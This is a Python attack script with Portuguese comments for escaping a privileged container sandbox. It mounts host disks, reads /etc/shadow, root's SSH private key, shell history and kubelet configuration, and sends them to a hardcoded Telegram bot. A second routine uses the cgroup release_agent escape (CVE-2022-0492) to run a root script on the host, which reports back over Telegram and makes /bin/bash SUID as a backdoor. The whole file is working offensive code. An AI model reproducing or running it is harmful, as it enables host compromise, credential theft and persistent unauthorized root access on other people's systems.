#!/usr/bin/env python3
"""
Escape de sandbox com CAP_SYS_ADMIN.
Tenta montar o host e exfiltrar dados via Telegram.
Baseado nas técnicas observadas em ambientes privilegiados.
"""

import subprocess
import json
import requests
import os
import sys
import time
import glob
from datetime import datetime

# ------------------------------------------------------------
# CONFIGURAÇÃO DO TELEGRAM (substitua pelos seus dados)
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"  # mesmo do original
TELEGRAM_CHAT_ID = "230885588"

# ------------------------------------------------------------
# FUNÇÕES AUXILIARES
# ------------------------------------------------------------
def run(cmd, timeout=15):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except Exception:
        pass

def send_file(filename, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except Exception:
        pass

def check_cap_sys_admin():
    """Verifica se temos CAP_SYS_ADMIN lendo /proc/self/status."""
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("CapEff:"):
                    caps = int(line.split()[1], 16)
                    # CAP_SYS_ADMIN = 0x200000
                    return bool(caps & 0x200000)
        return False
    except:
        return False

# ------------------------------------------------------------
# TÉCNICA 1: MONTAGEM DIRETA DO DISCO DO HOST
# ------------------------------------------------------------
def try_mount_host():
    """
    Tenta montar cada dispositivo de bloco comum em /mnt.
    Retorna True se conseguir montar e encontrar /mnt/etc/shadow ou /mnt/root.
    """
    # Lista de possíveis dispositivos (nuvem, virtualização, etc.)
    devices = [
        "/dev/vda1", "/dev/sda1", "/dev/xvda1", "/dev/nvme0n1p1",
        "/dev/vdb1", "/dev/sdb1", "/dev/xvdb1", "/dev/disk/by-uuid/*"
    ]
    # Cria o ponto de montagem
    os.makedirs("/mnt", exist_ok=True)

    for pattern in devices:
        for dev in glob.glob(pattern):
            if not os.path.exists(dev):
                continue
            print(f"[+] Tentando montar {dev}")
            # Tenta montar
            result = run(f"mount {dev} /mnt 2>/dev/null")
            if "ERRO" not in result:
                # Verifica se há sinais de sistema de arquivos do host
                if os.path.exists("/mnt/etc/shadow") or os.path.exists("/mnt/root"):
                    send_telegram(f"✅ **Montagem bem-sucedida em {dev}**")
                    return True
                # Se não for o root, desmonta para tentar o próximo
                run("umount /mnt 2>/dev/null")
    return False

def collect_host_data():
    """Coleta arquivos sensíveis do host montado em /mnt."""
    data = {}
    targets = {
        "host_shadow": "/mnt/etc/shadow",
        "host_passwd": "/mnt/etc/passwd",
        "host_ssh_key": "/mnt/root/.ssh/id_rsa",
        "host_bash_history": "/mnt/root/.bash_history",
        "host_hostname": "/mnt/etc/hostname",
        "host_resolv": "/mnt/etc/resolv.conf",
        "host_proc_environ": "/mnt/proc/1/environ",
        "host_kubelet_config": "/mnt/var/lib/kubelet/config",
        "host_docker_sock": "/mnt/run/docker.sock",   # só para saber se existe
        "host_etc_hosts": "/mnt/etc/hosts"
    }
    for key, path in targets.items():
        try:
            if os.path.exists(path) and os.path.isfile(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(10000)  # limite de 10k caracteres
                data[key] = content
            else:
                data[key] = "N/A"
        except Exception as e:
            data[key] = f"ERRO: {e}"
    return data

def send_host_data(data):
    """Envia os dados coletados do host via Telegram."""
    for key, content in data.items():
        if content and content != "N/A" and "ERRO" not in content:
            if len(content) > 4000:
                # Envia como arquivo
                tmp = f"/tmp/{key}.txt"
                with open(tmp, "w", encoding="utf-8") as f:
                    f.write(content)
                send_file(tmp, caption=f"📄 {key}")
                os.remove(tmp)
            else:
                send_telegram(f"📄 **{key}**\n```\n{content}\n```")
    # Também envia um JSON completo
    json_file = f"host_escape_{int(datetime.now().timestamp())}.json"
    with open(json_file, "w") as f:
        json.dump(data, f, indent=2)
    send_file(json_file, caption="📁 Dados completos do host")
    os.remove(json_file)

# ------------------------------------------------------------
# TÉCNICA 2: CGROUP RELEASE_AGENT (CVE-2022-0492)
# ------------------------------------------------------------
def cgroup_release_agent_exploit():
    """
    Tenta usar o release_agent do cgroup para executar comandos no host.
    Requer CAP_SYS_ADMIN e cgroup v1 montado.
    """
    try:
        # Cria diretório e monta cgroup de memória
        os.makedirs("/tmp/cgrp", exist_ok=True)
        subprocess.run("mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null", shell=True)
        if not os.path.exists("/tmp/cgrp/release_agent"):
            send_telegram("❌ Cgroup não disponível")
            return False

        # Prepara um script que envia um sinal de escape via Telegram
        # (aqui pode-se colocar um reverse shell, mas mantemos apenas uma notificação)
        with open("/tmp/escape.sh", "w") as f:
            f.write("""#!/bin/sh
# Comando que será executado como root no host
curl -s -X POST -d "host=$(hostname)" https://api.telegram.org/bot"""+TELEGRAM_BOT_TOKEN+"""/sendMessage -d chat_id="""+TELEGRAM_CHAT_ID+""" -d text="⚠️ **Cgroup exploit executado no host!**"
# Opcional: criar um backdoor SUID
chmod 4755 /bin/bash 2>/dev/null
""")
        os.chmod("/tmp/escape.sh", 0o755)

        # Configura o release_agent para apontar para nosso script
        with open("/tmp/cgrp/release_agent", "w") as f:
            f.write("/tmp/escape.sh")

        # Cria um subcgroup e ativa notify_on_release
        os.makedirs("/tmp/cgrp/x", exist_ok=True)
        with open("/tmp/cgrp/x/notify_on_release", "w") as f:
            f.write("1")
        # Adiciona o shell atual ao cgroup
        with open("/tmp/cgrp/x/cgroup.procs", "w") as f:
            f.write(str(os.getpid()))

        # Mata o processo para acionar o release_agent (opcional)
        # Neste caso, como estamos no mesmo processo, podemos forçar um kill
        send_telegram("✅ **Cgroup exploit configurado – aguardando execução...**")
        # Para forçar, mata o shell atual (mas perderíamos o script)
        # Em vez disso, sugerimos que o usuário saia do shell para acionar.
        return True
    except Exception as e:
        send_telegram(f"❌ Cgroup exploit falhou: {e}")
        return False

# ------------------------------------------------------------
# FUNÇÃO PRINCIPAL
# ------------------------------------------------------------
def main():
    send_telegram("🚀 **Iniciando tentativa de escape do sandbox**")

    # Verifica privilégios
    if check_cap_sys_admin():
        send_telegram("✅ **CAP_SYS_ADMIN presente** – privilegiado!")
    else:
        send_telegram("⚠️ **CAP_SYS_ADMIN ausente** – pode não funcionar")

    # Tenta montar o host
    if try_mount_host():
        send_telegram("📁 **Host montado com sucesso em /mnt!** Coletando dados...")
        host_data = collect_host_data()
        send_host_data(host_data)
    else:
        send_telegram("❌ **Falha na montagem do host** – tentando cgroup exploit...")
        cgroup_release_agent_exploit()

    # Coleta informações do container para contexto
    container_env = run("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'")
    if container_env:
        if len(container_env) > 4000:
            tmp = "/tmp/container_env.txt"
            with open(tmp, "w") as f:
                f.write(container_env)
            send_file(tmp, caption="📄 Container environ")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **Container environ**\n```\n{container_env}\n```")

    send_telegram("✅ **Escape finalizado.**")

if __name__ == "__main__":
    main()
